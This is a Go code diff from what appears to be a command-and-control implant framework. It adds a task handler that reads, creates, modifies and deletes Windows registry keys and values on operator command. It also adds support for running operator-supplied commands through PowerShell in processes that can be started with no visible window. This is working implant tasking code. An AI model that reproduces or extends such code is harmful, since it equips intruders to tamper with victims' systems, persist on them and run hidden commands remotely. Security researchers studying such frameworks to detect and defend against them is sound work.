@@ -12,7 +12,10 @@ import (
 	"github.com/iDigitalFlame/xmt/cmd/evade"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/device/regedit"
+	"github.com/iDigitalFlame/xmt/device/winapi/registry"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
+	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
 func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
@@ -120,6 +123,117 @@ func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
 func taskRename(_ context.Context, _ data.Reader, _ data.Writer) error {
 	return device.ErrNoNix
 }
+func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
+	var (
+		o   uint8
+		k   string
+		err = r.ReadUint8(&o)
+	)
+	if err != nil {
+		return err
+	}
+	if err = r.ReadString(&k); err != nil {
+		return err
+	}
+	if o > regOpSetStringList {
+		return registry.ErrUnexpectedType
+	}
+	if len(k) == 0 {
+		return xerr.Sub("empty key name", 0x9)
+	}
+	switch w.WriteUint8(o); o {
+	case regOpLs:
+		e, err1 := regedit.Dir(k)
+		if err1 != nil {
+			return err1
+		}
+		w.WriteUint32(uint32(len(e)))
+		for i := range e {
+			if err = e[i].MarshalStream(w); err != nil {
+				return err
+			}
+		}
+		return nil
+	case regOpMake:
+		return regedit.MakeKey(k)
+	case regOpDeleteKey:
+		f, err1 := r.Bool()
+		if err1 != nil {
+			return err1
+		}
+		return regedit.DeleteKey(k, f)
+	}
+	v, err := r.StringVal()
+	if err != nil {
+		return err
+	}
+	if len(v) == 0 {
+		return xerr.Sub("empty value name", 0x9)
+	}
+	switch o {
+	case regOpGet:
+		x, err1 := regedit.Get(k, v)
+		if err1 != nil {
+			return err1
+		}
+		x.MarshalStream(w)
+	case regOpSet:
+		t, err1 := r.Uint32()
+		if err1 != nil {
+			return err1
+		}
+		b, err1 := r.Bytes()
+		if err1 != nil {
+			return err1
+		}
+		regedit.Set(k, v, t, b)
+	case regOpDelete:
+		f, err1 := r.Bool()
+		if err1 != nil {
+			return err1
+		}
+		return regedit.DeleteEx(k, v, f)
+	case regOpSetDword:
+		d, err1 := r.Uint32()
+		if err1 != nil {
+			return err1
+		}
+		return regedit.SetDword(k, v, d)
+	case regOpSetQword:
+		d, err1 := r.Uint64()
+		if err1 != nil {
+			return err1
+		}
+		return regedit.SetQword(k, v, d)
+	case regOpSetBytes:
+		b, err1 := r.Bytes()
+		if err1 != nil {
+			return err1
+		}
+		return regedit.SetBytes(k, v, b)
+	case regOpSetString:
+		s, err1 := r.StringVal()
+		if err1 != nil {
+			return err1
+		}
+		return regedit.SetString(k, v, s)
+	case regOpSetStringList:
+		var l []string
+		if err = data.ReadStringList(r, &l); err != nil {
+			return err
+		}
+		return regedit.SetStrings(k, v, l)
+	case regOpSetExpandString:
+		s, err1 := r.StringVal()
+		if err1 != nil {
+			return err1
+		}
+		return regedit.SetExpandString(k, v, s)
+	default:
+		return registry.ErrUnexpectedType
+	}
+	return nil
+}
 
 // DLLUnmarshal will read this DLL's struct data from the supplied reader and
 // returns a DLL runnable struct along with the wait and delete status booleans.
@@ -170,6 +284,8 @@ func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, bool,
 	v := cmd.NewZombieContext(x, nil, z.Args...)
 	if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'S' && z.Args[0][5] == 'L' {
 		v.Args = []string{device.Shell, device.ShellArgs, strings.Join(z.Args[1:], " ")}
+	} else if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'P' && z.Args[0][5] == 'L' {
+		v.Args = append([]string{device.PowerShell}, z.Args[1:]...)
 	}
 	if v.SetFlags(z.Flags); z.Hide {
 		v.SetNoWindow(true)
